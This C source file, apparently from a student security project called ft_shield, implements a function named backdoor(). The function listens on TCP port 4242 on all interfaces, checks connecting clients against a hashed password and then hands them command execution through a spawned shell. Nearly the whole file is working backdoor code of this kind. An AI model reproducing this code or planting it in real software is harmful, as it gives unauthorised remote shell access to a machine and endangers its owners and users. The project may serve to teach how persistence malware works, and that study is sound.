#include "ft_shield.h"

t_serv		serv;

void	reset_client(t_client *client)
{
	int status;

	close(client->fd);
	if (client->output_pid >= 0)
	{
		kill(client->output_pid, SIGINT);
		waitpid(client->output_pid, &status, 0);
	}
	client->fd = -1;
	client->logged = false;
	client->fd_shell = -1;
	client->shell_pid = -1;
	client->output_pid = -1;
}

void	remove_client(t_serv *serv, int fd)
{
	FD_CLR(fd, &serv->fd_master);
	close(fd);
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
		{
			reset_client(&serv->clients[i]);
			break ;
		}
	}
	serv->nb_clients--;
}

void	backdoor(void)
{
	bzero(&serv, sizeof(t_serv));
	serv.port = 4242;
	serv.sockfd = socket(PF_INET, SOCK_STREAM, 0);
	if (serv.sockfd < 0)
		return ;
	serv.addr.sin_family = AF_INET;
	serv.addr.sin_port = htons(serv.port);
	serv.addr.sin_addr.s_addr = htonl(0); // 0.0.0.0
	while (bind(serv.sockfd, (struct sockaddr *)&serv.addr, sizeof(serv.addr)) < 0)
		sleep(1);
	listen(serv.sockfd, 100);

	FD_ZERO(&serv.fd_read);
	FD_ZERO(&serv.fd_master);
	FD_SET(serv.sockfd, &serv.fd_master);
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		serv.clients[i].shell_pid = -1;
		serv.clients[i].output_pid = -1;
		reset_client(&serv.clients[i]);
	}
	int fd_max = serv.sockfd;
	sigset_t mask;
	sigemptyset(&mask);
	sigaddset(&mask, SIGCHLD);
	while (true)
	{
		serv.fd_read = serv.fd_master;
		pselect(fd_max + 1, &serv.fd_read, NULL, NULL, NULL, &mask);
		int fd = 0;
		while (fd < fd_max + 1)
		{
			if (FD_ISSET(fd, &serv.fd_read))
			{
				struct sockaddr_in		cli;
				socklen_t				len;
				char buffer[BUFFER_SIZE + 1];
				bzero(&buffer, BUFFER_SIZE + 1);
				if (fd == serv.sockfd)
				{
					len = sizeof(cli);
					int new_fd = accept(serv.sockfd, (struct sockaddr *)&cli, &len);
					if (serv.nb_clients < MAX_CLIENTS)
					{
						if (new_fd > fd_max)
							fd_max = new_fd;
						FD_SET(new_fd, &serv.fd_master);
						for (int i = 0; i < MAX_CLIENTS; i++)
						{
							if (serv.clients[i].fd == -1)
							{
								serv.clients[i].fd = new_fd;
								serv.clients[i].logged = false;
								break ;
							}
						}
						serv.nb_clients++;
						if (send_str(new_fd, "Password: ") < 0)
							remove_client(&serv, new_fd);
					}
					else
						close(new_fd);
					break ;
				}
				else
				{
					int len_read;
					if ((len_read = recv(fd, buffer, BUFFER_SIZE, 0)) <= 0) // ERROR OR LEAVING
						remove_client(&serv, fd);
					else
					{
						t_client *client = NULL;
						for (int i = 0; i < MAX_CLIENTS; i++)
						{
							if (serv.clients[i].fd == fd)
							{
								client = &serv.clients[i];
								break ;
							}
						}
						if (client)
						{
							if (client->logged && client->output_pid >= 0) // client in shell
							{
								int status;
								int result = waitpid(client->output_pid, &status, WNOHANG);
								if (!result)
									write(client->fd_shell, buffer, len_read);
								else // died or error
								{
									close(client->fd_shell);
									client->fd_shell = -1;
									client->shell_pid = -1;
									client->output_pid = -1;
								}
							}
							if (!client->logged || client->output_pid == -1) // client not in shell
							{
								char *msg = buffer;
								char *end = memchr(buffer, '\n', len_read);
								if (!end)
									end = buffer + len_read;
								*end = '\0';
								while (msg - buffer < len_read)
								{
									if (!client->logged)
									{
										char *hash = sha256(msg, strlen(msg));
										if (!strcmp(hash, HASHED_PWD))
										{
											if (send_str(client->fd, PROMPT) < 0)
											{
												remove_client(&serv, fd);
												break ;
											}
											client->logged = true;
										}
										else
										{
											if (send_str(fd, "Password: ") < 0)
											{
												remove_client(&serv, fd);
												break ;
											}
										}
										free(hash);
									}
									else if (client->logged)
									{
										launch_command(&serv, fd, msg);
										if (client->logged && client->output_pid == -1)
										{
											if (send_str(fd, PROMPT) < 0)
											{
												remove_client(&serv, fd);
												break ;
											}
										}
										else if (!client->logged)
										{
											if (send_str(fd, "Password: ") < 0)
											{
												remove_client(&serv, fd);
												break ;
											}
										}
									}
									msg += strlen(msg) + 1;
									end = memchr(end + 1, '\n', len_read - (end - buffer));
									if (!end)
										end = buffer + len_read;
									*end = '\0';
								}
							}
						}
					}
				}
			}
			fd++;
		}
	}
}
